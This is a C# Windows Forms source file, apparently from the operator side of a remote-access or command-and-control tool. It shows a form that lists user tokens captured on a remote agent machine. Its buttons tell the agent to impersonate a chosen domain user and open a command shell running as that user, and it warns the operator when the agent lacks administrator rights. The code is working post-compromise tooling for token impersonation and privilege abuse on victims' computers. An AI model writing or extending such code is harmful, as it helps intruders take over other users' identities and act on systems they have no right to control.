using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmImpersonation : Form
    {
        private Client c;
        public FrmImpersonation(Client client)
        {
            c = client;
            InitializeComponent();
        }

        private void ImperonationMenu_Load(object sender, EventArgs e)
        {
            int rownum = 0;
            this.Text = c.Value.PCName + " impersonations";
            foreach(var item in FrmMain.Instance.impersonatedUsers)
            {
                if(item.Value.agent.ToLower() == c.Value.Id.ToLower())
                {
                    dgTokens.Rows.Add();
                    dgTokens.Rows[rownum].Cells[0].Value = item.Value.domain;
                    dgTokens.Rows[rownum].Cells[1].Value = item.Value.username;
                    dgTokens.Rows[rownum].Cells[2].Value = item.Value.guid;
                    rownum++;
                }
            }
            if(c.Value.AccountType.ToLower() != "admin")
            {
                MessageBox.Show("Warning: Impersonation will fail if you try to impersonate an Administrative user while the agent is running in a lower context.");
            }
        }

        private void dgTokens_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            dgTokens.Rows.Clear();
            int rownum = 0;
            this.Text = c.Value.PCName + " impersonations";
            foreach (var item in FrmMain.Instance.impersonatedUsers)
            {
                if (item.Value.agent.ToLower() == c.Value.Id.ToLower())
                {
                    dgTokens.Rows.Add();
                    dgTokens.Rows[rownum].Cells[0].Value = item.Value.domain;
                    dgTokens.Rows[rownum].Cells[1].Value = item.Value.username;
                    rownum++;
                }
            }
        }

        private void btnStopImpersonation_Click(object sender, EventArgs e)
        {
            new xServer.Core.Packets.ServerPackets.DoEnableImpersonation(false, "").Execute(c);
        }

        private void btnImpersonate_Click(object sender, EventArgs e)
        {
            DataGridViewRow selected = dgTokens.SelectedRows[0];
            if (selected != null)
            {
                //Sends Impersonation user in the format domain\username
                string impersonationUser = selected.Cells[2].Value.ToString();
                MessageBox.Show("Impersonating " + selected.Cells[0].Value.ToString() + "\\" + selected.Cells[1].Value.ToString());
                new xServer.Core.Packets.ServerPackets.DoEnableImpersonation(true, impersonationUser).Execute(c);
            }
            else
            {
                MessageBox.Show("Please select a user to impersonate first!");
            }
        }

        private void btnCmdImpersonate_Click(object sender, EventArgs e)
        {
            DataGridViewRow selected = dgTokens.SelectedRows[0];
            if(selected != null){
                string impersonationUser = selected.Cells[2].Value.ToString();
                new xServer.Core.Packets.ServerPackets.DoEnableImpersonation(true, impersonationUser).Execute(c);
                FrmShellImpersonate frm = new FrmShellImpersonate(c, impersonationUser);
                frm.Activate();
                frm.Show();
            }
            else
            {
                MessageBox.Show("Please select a user to impersonate first!");
            }
        }
    }
}
